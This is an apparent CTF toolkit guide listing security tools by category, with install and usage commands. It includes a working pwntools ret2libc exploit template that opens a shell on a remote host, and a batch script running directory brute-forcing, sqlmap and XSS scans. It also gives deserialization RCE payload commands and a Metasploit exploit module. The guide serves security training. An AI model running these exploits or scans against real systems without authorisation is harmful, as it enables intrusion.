# CTF Toolkit Guide

📦 Part 1: Environment Setup & Tool Collection
## 1.1 Recommended Operating Systems

| Distro | Features | Download |
|--------|----------|----------|
| Kali Linux | Pre-installed security tools, rolling release | [kali.org](https://www.kali.org) |
| Parrot Security | Lightweight, suitable for low-spec machines | [parrotsec.org](https://www.parrotsec.org) |
| Ubuntu 22.04+ | Clean environment, install via scripts | [ubuntu.com](https://ubuntu.com) |

**Quick Script (One-click tool installation):**

```bash
# Basic toolset installation (skip if using Kali)
sudo apt update && sudo apt install -y \
  nmap masscan whatweb dirb gobuster ffuf wfuzz \
  nikto nuclei sqlmap xsstrike commix wafw00f \
  gdb radare2 binwalk foremost volatility3 \
  apktool jadx dex2jar steghide zsteg wireshark \
  hashcat john aircrack-ng yara oletools \
  python3-pip git docker.io

pip3 install pwntools ropper angr frida-tools objection
```

## 1.2 Toolkit Reference Projects

The following projects can be cloned directly or used as a checklist:

- **Awesome CTF** — Comprehensive categorized CTF resource list
- **ctftools** — Multi-script installer with one-click setup
- **CTF-Katana** — Containerized tool collection
- **pwntools** — Binary exploitation Swiss army knife
- **CyberChef** — Browser-based encoding/decoding tool

**Docker Quick Environment Example:**

```bash
# Pull an image with multiple CTF tools integrated
docker run -it --name ctf-tools --privileged kalilinux/kali-rolling /bin/bash
# Run installation scripts inside
```

📖 Table of Contents
- [Web](#web)
- [Pwn](#pwn)
- [Reverse](#reverse)
- [Crypto](#crypto)
- [Misc/Forensics](#miscforensics)
- [Mobile](#mobile)
- [Automation & Scripting](#automation--scripting)
- [Contributing](#contributing)

---

## Web

### Information Gathering

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| nmap | Port scanning, service detection, script probing | `sudo apt install nmap` | `nmap -sV -sC -p- 10.10.10.10` |
| masscan | High-speed internet-scale port scanning | `sudo apt install masscan` | `masscan -p1-65535 --rate=1000 10.10.10.10` |
| whatweb | Identify website technology stack | `sudo apt install whatweb` | `whatweb http://target.com` |
| dirb | Directory/file brute forcing | `sudo apt install dirb` | `dirb http://target.com wordlist.txt` |
| gobuster | Fast directory/DNS/vhost enumeration | `sudo apt install gobuster` | `gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt` |
| ffuf | High-speed fuzzing (directories, parameters, etc.) | `sudo apt install ffuf` | `ffuf -u http://target.com/FUZZ -w wordlist.txt` |
| wfuzz | Web app brute force, injection parameter discovery | `pip install wfuzz` | `wfuzz -c -z file,wordlist.txt http://target.com/FUZZ` |
| dnsrecon | DNS enumeration & subdomain collection | `sudo apt install dnsrecon` | `dnsrecon -d target.com -t std` |

> Workflow example: Use nmap to discover open ports and services, then whatweb to identify web technologies, and finally gobuster to enumerate paths.

### Vulnerability Scanning

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| nikto | Comprehensive web server vulnerability scanner | `sudo apt install nikto` | `nikto -h http://target.com` |
| wapiti | Web application black-box vulnerability scanner | `pip install wapiti3` | `wapiti -u http://target.com` |
| nuclei | Template-based fast vulnerability scanner, customizable | `go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest` | `nuclei -u http://target.com -t cves/` |
| searchsploit | Exploit-DB local search | `sudo apt install exploitdb` | `searchsploit apache 2.4` |
| metasploit scanner modules | Built-in framework scanner | msfconsole | `use auxiliary/scanner/http/dir_scanner` |

### SQL Injection

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| sqlmap | Automated SQL injection detection & exploitation | `sudo apt install sqlmap` | `sqlmap -u "http://target.com?id=1" --dbs` |
| jSQL Injection | Java GUI SQL injection tool | `git clone https://github.com/ron190/jsql-injection` | `java -jar jsql-injection.jar` |
| NoSQLMap | NoSQL injection automation | `git clone https://github.com/codingo/NoSQLMap` | `python nosqlmap.py -h target.com` |

### XSS

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| XSStrike | XSS detection & exploitation, supports DOM XSS | `git clone https://github.com/s0md3v/XSStrike` | `python xsstrike.py -u "http://target.com?q=test"` |
| xsser | Automated XSS discovery & exploitation framework | `sudo apt install xsser` | `xsser -u "http://target.com?p=1"` |
| dalfox | Fast & efficient XSS parameter scanning | `go install github.com/hahwul/dalfox/v2@latest` | `dalfox url http://target.com?p=1` |

### Command Injection / File Inclusion

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| commix | Automated command injection exploitation | `sudo apt install commix` | `commix --url="http://target.com?cmd=whoami"` |
| LFISuite | LFI/RFI automated attack tool | `git clone https://github.com/D35m0nd142/LFISuite` | `python lfisuite.py` |
| burp intruder | Use Burp custom payloads to test command injection | See Integrated Frameworks | |

### Deserialization

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| ysoserial | Java deserialization payload generator | `git clone https://github.com/frohoff/ysoserial` (requires Maven build) | `java -jar ysoserial.jar CommonsCollections1 "cmd.exe"` |
| phpggc | PHP deserialization gadget chains | `git clone https://github.com/ambionics/phpggc` | `php phpggc Laravel/RCE1 system 'id'` |

### WAF Detection & Bypass

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| wafw00f | Identify Web Application Firewalls | `sudo apt install wafw00f` | `wafw00f http://target.com` |
| WhatWaf | WAF detection & bypass testing | `git clone https://github.com/Ekultek/WhatWaf` | `python whatwaf.py -u http://target.com` |

### Integrated Frameworks (Web)

| Tool | Description | Install | Typical Usage/Modules |
|------|-------------|---------|----------------------|
| Burp Suite | HTTP proxy, repeater, scanner, plugin ecosystem | Community Edition free, Pro paid. Pre-installed on Kali | `java -jar burpsuite.jar` |
| OWASP ZAP | Open-source web application security scanner | `sudo apt install zaproxy` | `zap.sh -cmd -quickurl http://target.com` |
| Metasploit | Contains numerous web attack modules | msfconsole | `use exploit/multi/http/struts2_code_exec` |

---

## Pwn

### Environment & Debugging

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| pwndbg | GDB plugin for binary vulnerability debugging | `git clone https://github.com/pwndbg/pwndbg` then `./setup.sh` | `gdb-pwndbg ./pwn` |
| peda | GDB Python enhancement | `git clone https://github.com/longld/peda`, add source to ~/.gdbinit | `gdb-peda ./pwn` |
| GEF | GDB enhancement, multi-arch support | `git clone https://github.com/hugsy/gef`, same as peda setup | `gdb-gef ./pwn` |
| radare2 | Reverse engineering framework, also for dynamic debugging | `sudo apt install radare2` | `r2 -d ./pwn` |
| Ghidra | NSA open-source static analysis with debug support (slow) | Download from official site | GUI operation, CLI: `analyzeHeadless` |

### Exploit Development

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| pwntools | Python binary exploitation library | `pip install pwntools` | `from pwn import *` |
| ROPgadget | ROP gadget search | `pip install ropgadget` | `ROPgadget --binary ./pwn --ropchain` |
| Ropper | Faster ROP tool | `pip install ropper` | `ropper -f ./pwn --search "pop rdi"` |
| one_gadget | Find one-gadget RCE in libc | `gem install one_gadget` | `one_gadget libc.so.6` |
| LibcSearcher | Identify libc version from leaked addresses | `git clone https://github.com/lieanu/LibcSearcher` | `python LibcSearcher.py <address>` |

### Auxiliary Analysis

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| checksec | Check binary protection mechanisms (comes with pwntools) | Already installed | `checksec ./pwn` or `pwn checksec ./pwn` |
| readelf/objdump | Part of binutils | Built-in | `readelf -h ./pwn` |
| pwninit | Auto-download matching ld-linux and libc, generate startup scripts | `cargo install pwninit` | `pwninit --bin ./pwn --libc libc.so.6` |

---

## Reverse

### Static Analysis

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| Ghidra | NSA open-source reverse engineering framework, multi-arch decompilation | Download from official site | `./ghidraRun` (GUI) or `analyzeHeadless <project> -import binary` |
| IDA Free/Pro | Industry standard disassembler | Download from official site | `ida64 binary` (GUI) or `idat64 -A -Sscript.idc binary` |
| radare2 | Command-line disassembly, analysis, debugging | `sudo apt install radare2` | `r2 -A ./binary` → `aaa; pdf @ main` |
| Binary Ninja | Modern reverse engineering platform, free version sufficient | Download from official site | `binaryninja binary` (GUI) |
| Cutter | radare2 GUI frontend | `sudo apt install cutter` | `cutter ./binary` |

### Dynamic Debugging

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| x64dbg | Open-source Windows debugger | Download from official site | GUI operation |
| Frida | Cross-platform dynamic instrumentation | `pip install frida-tools` | `frida -l script.js -f com.example.app` |
| ltrace/strace | Trace library functions/syscalls (Linux) | Built-in | `ltrace ./binary` |

### Unpacking & Extraction

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| UPX | Famous compression packer, built-in unpacking | `sudo apt install upx-ucl` | `upx -d binary.exe` |
| binwalk | Firmware/file extraction analysis | `sudo apt install binwalk` | `binwalk -e file.bin` |
| foremost | File carving recovery | `sudo apt install foremost` | `foremost -i disk.img` |
| strings | Extract printable strings | Built-in | `strings binary \| grep flag` |

### Symbolic Execution & Constraint Solving

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| angr | Python binary analysis framework with symbolic execution | `pip install angr` | See automation scripts section |
| Z3 | Microsoft theorem prover, angr backend | `pip install z3-solver` | Python API |
| Miasm | Reverse engineering framework with symbolic execution | `pip install miasm` | |

---

## Crypto

### Classical Cryptography

| Tool/Resource | Description | Example Usage |
|---------------|-------------|---------------|
| CyberChef | Online encoding/decoding/encryption Swiss army knife, can be deployed locally | Browser: https://gchq.github.io/CyberChef |
| quipquip | Quick simple substitution cipher solver | Browser: https://quipquip.com |
| dcode.fr | Online cryptography toolbox | |
| ciphey | Auto-decryption tool (uses AI guessing) | `pip install ciphey` → `ciphey -t "ciphertext"` |

### Modern Cryptography

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| RsaCtfTool | Fully automated RSA attack tool | `git clone https://github.com/Ganapati/RsaCtfTool` | `python3 RsaCtfTool.py --publickey key.pub --uncipherfile ciphertext` |
| x509 / openssl | Parse certificates, handle public/private keys | Built-in | `openssl rsa -pubin -in key.pub -text` |
| John the Ripper | Hash cracking (supports zip, rar, etc.) | `sudo apt install john` | `john --wordlist=rockyou.txt hash.txt` |
| hashcat | GPU-accelerated hash cracking | `sudo apt install hashcat` | `hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a` |
| factordb | Online large number factorization | Browser: http://factordb.com | |

### Encoding & Data Conversion

| Type | Command/Tool |
|------|--------------|
| Base64/32/16 | `echo "c2VjcmV0" \| base64 -d` |
| Hex encoding/decoding | `echo "48656c6c6f" \| xxd -r -p` |
| URL encoding | CyberChef or Python urllib.parse |
| Binary/Morse/etc. | CyberChef |

### Mathematical Tools

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| SageMath | Powerful math system, ideal for Coppersmith, elliptic curves, etc. | `sudo apt install sagemath` | `sage -c "factor(123456789)"` |
| Python (sympy, gmpy2) | Symbolic computation & high-precision arithmetic | `pip install sympy gmpy2` | Script: `from sympy import isprime` |

---

## Misc/Forensics

### Steganography Analysis

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| steghide | Image/audio steganography embedding & extraction | `sudo apt install steghide` | `steghide extract -sf image.jpg` |
| zsteg | PNG/BMP steganography detection | `gem install zsteg` | `zsteg -a stego.png` |
| stegsolve | Image channel viewer (Java GUI) | Download jar | `java -jar stegsolve.jar` |
| pngcheck | Check PNG file integrity/hidden data | `sudo apt install pngcheck` | `pngcheck -v file.png` |
| binwalk | Internal file extraction | See above | `binwalk -e mysterious.jpg` |

### Traffic Analysis

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| Wireshark | GUI packet capture analysis | `sudo apt install wireshark` | `wireshark capture.pcapng` |
| tshark | Wireshark command-line version | `sudo apt install tshark` | `tshark -r capture.pcap -T fields -e ip.src -e ip.dst` |
| tcpdump | Command-line packet capture | Built-in | `tcpdump -i eth0 -w capture.pcap` |
| NetworkMiner | Network forensics analysis (Windows/GUI) | Download from official site | |
| ettercap | MITM attack & traffic analysis | `sudo apt install ettercap-graphical` | |

### Memory & Disk Forensics

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| Volatility 3 | Memory forensics framework | `pip install volatility3` | `vol -f memory.dump windows.pslist` |
| Autopsy / Sleuth Kit | Disk forensics analysis suite | `sudo apt install autopsy` | Browser: http://localhost:9999/autopsy |
| bulk_extractor | Extract features from disk images (emails, credit cards, etc.) | `sudo apt install bulk-extractor` | `bulk_extractor -o output/ disk.img` |
| dcfldd | Enhanced dd for imaging | `sudo apt install dcfldd` | `dcfldd if=/dev/sda hash=md5 of=image.dd` |

### File Analysis

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| file | Identify file type | Built-in | `file unknown.bin` |
| strings | Extract readable strings | Built-in | `strings -n 8 file.bin` |
| xxd | Hex viewer | Built-in | `xxd file.bin \| head` |
| binwalk | Unpack & extract | See above | |
| oletools | Analyze OLE documents (.doc/.xls) | `pip install oletools` | `olevba malicious.doc` |
| yara | Pattern matching, malware classification | `sudo apt install yara` | `yara rules.yar file.exe` |

---

## Mobile

### Android

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| apktool | Decompile APK to smali & resources | `sudo apt install apktool` | `apktool d app.apk -o output/` |
| jadx | Decompile dex to Java source code | `sudo apt install jadx` | `jadx-gui app.apk` or `jadx -d out app.apk` |
| dex2jar + JD-GUI | Convert dex to jar, then view with GUI | `sudo apt install dex2jar` | `d2j-dex2jar classes.dex` then `jd-gui classes.jar` |
| Frida | Dynamic instrumentation for Android/iOS | `pip install frida-tools` | `frida -U -f com.example.app -l script.js` |
| Objection | Frida-based runtime exploration tool | `pip install objection` | `objection -g com.example.app explore` |
| drozer | Android security assessment framework | Download from official site | `drozer console connect` |
| Android Studio | Built-in emulator & debugging | Download from official site | |

### iOS

| Tool | Description | Install | Typical Usage |
|------|-------------|---------|---------------|
| Frida | Same as above, supports iOS | Requires jailbreak or injection | `frida -U -l script.js SpringBoard` |
| Objection | Same as above | | `objection -g com.apple.mobilesafari explore` |
| class-dump | Export Objective-C header files | Build from source | `class-dump -H app` |

---

## 🤖 Automation & Scripting

### Python (pwntools) Typical Pwn Exploit Template

```python
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux')
# p = process('./vuln')
p = remote('target.com', 1337)

elf = ELF('./vuln')
libc = ELF('./libc.so.6')  # If provided

# Leak libc address
pop_rdi = 0x401253
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_addr = 0x4011a9

payload = b'A'*40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter('Input:', payload)
leaked = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leaked - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

# Second round getshell
payload = b'A'*40 + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendlineafter('Input:', payload)
p.interactive()
```

### Batch Scan Tool Invocation (Bash Script)

```bash
#!/bin/bash
TARGET="http://target.com"
# Directory scanning
gobuster dir -u $TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -o gobuster.log
# SQLi testing
sqlmap -u "$TARGET?id=1" --batch --level 3
# XSS scanning
xsstrike --url "$TARGET?q=test" --crawl
```

### Using angr for Automated Reverse Engineering Solving

```python
import angr
import claripy

proj = angr.Project('./crackme')
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)
simgr.explore(find=0x401337, avoid=0x401345)  # Success and failure addresses
if simgr.found:
    solution = simgr.found[0].posix.dumps(0)
    print(solution)
```

---

## 🤝 Contributing

Feel free to add more practical tools, fix errors, or provide better command examples. Please follow these steps:

1. Fork this repository
2. Add new tools under the appropriate category, maintaining consistent format (table with "Tool/Description/Install/Typical Usage")
3. Submit a Pull Request explaining the addition and testing environment

Or simply open an Issue with suggestions.

---

## 📜 License

This guide may be freely used, distributed, and modified without attribution. Tools themselves follow their respective original authors' licenses.

**Last updated: 2026-06-14**

**Maintainer: ljmsdbd@gmail.com**
